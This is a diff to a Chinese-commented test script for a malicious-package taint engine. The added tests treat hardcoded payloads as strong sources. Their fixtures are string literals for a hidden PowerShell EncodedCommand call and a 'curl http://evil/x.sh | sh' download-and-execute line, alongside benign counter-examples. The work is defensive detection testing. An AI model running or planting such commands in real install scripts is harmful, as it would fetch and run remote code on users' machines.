@@ -77,6 +77,7 @@ check("多链命中强源", escalation_gate([
 
 print("=== 5. 常量完备性 ===")
 engine_sources = {cat for _, cat in SOURCE_PATTERNS}
+engine_sources.add('hardcoded_payload')  # 由 HARDCODED_PAYLOAD_PATTERNS 独立产出
 engine_sinks = {cat for _, cat in SINK_PATTERNS}
 check("强源集合 <= 引擎 Source 类别", STRONG_SOURCES <= engine_sources,
       detail=f"{STRONG_SOURCES - engine_sources}")
@@ -191,6 +192,41 @@ check("无链信息的恶意子图 → 不降级(不等于弱链)",
       _llm_malicious_weak_only(
           [{'final_verdict': 'MALICIOUS', 'llm_used': True}],
           {'overall_threat_level': 'high'}) == [])
+
+print("=== 9. 硬编码载荷作为 source（2026-11，EsqueleSquad 家族驱动）===")
+from src.taint_engine import analyze as taint_analyze, HARDCODED_PAYLOAD_PATTERNS
+
+def taint(code, nid='n1'):
+    nodes = [{'node_id': nid, 'code': code, 'line': 8, 'file': 'setup.py', 'type': 'call'}]
+    edges = [{'from_node': nid, 'to_node': nid, 'kind': 'data'}]
+    return taint_analyze(nodes, edges)
+
+# 真实形态：PowerShell EncodedCommand 直接执行
+ps = ("subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand "
+      "cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdA==', "
+      "shell=False)")
+c = taint(ps)
+hw = [x for x in c if x['source_category'] == 'hardcoded_payload']
+check("PowerShell EncodedCommand → hardcoded_payload 链", len(hw) == 1)
+check("链被门控认可为强源", bool(escalation_gate(hw)))
+check("payload_kind 归类", hw and hw[0].get('payload_kind') == 'powershell_encoded')
+
+# curl | sh
+c2 = [x for x in taint("os.system('curl http://evil/x.sh | sh')")
+      if x['source_category'] == 'hardcoded_payload']
+check("下载管道执行 → hardcoded_payload", len(c2) == 1)
+
+# 反例：普通 base64 字面量不触发
+c3 = [x for x in taint("exec(base64.b64decode('aGVsbG8='))")
+      if x['source_category'] == 'hardcoded_payload']
+check("普通 base64 不触发（防误报）", len(c3) == 0)
+
+# 反例：普通 subprocess 调用不触发
+c4 = [x for x in taint("subprocess.run(['ls', '-la'])")
+      if x['source_category'] == 'hardcoded_payload']
+check("普通 subprocess 不触发", len(c4) == 0)
+
+check("hardcoded_payload 在 STRONG_SOURCES", 'hardcoded_payload' in STRONG_SOURCES)
 
 print(f"\n结果: {PASS} 通过, {FAIL} 失败")
 sys.exit(1 if FAIL else 0)
